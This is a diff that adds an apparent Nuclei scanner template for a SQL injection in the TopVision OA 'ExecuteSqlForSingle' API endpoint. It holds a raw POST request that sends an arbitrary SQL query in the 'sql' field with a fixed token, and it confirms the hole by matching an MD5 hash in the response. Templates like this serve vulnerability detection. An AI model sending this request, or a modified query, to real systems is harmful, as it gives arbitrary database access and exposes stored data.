@@ -1,0 +1,26 @@
+id: topvision-oa-sql-injection
+info:
+  name: TopVision OA ExecuteSqlForSingle SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    TopVision OA has a SQL injection vulnerability in the ExecuteSqlForSingle endpoint, allowing attackers to execute arbitrary SQL queries and potentially obtain sensitive database information.
+  reference:
+    - http://www.its365.net/products.aspx/
+http:
+  - raw:
+      - |
+        POST /api/system/ExecuteSqlForSingle HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&strParameters=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e10adc3949ba59abbe56e057f20f883e"
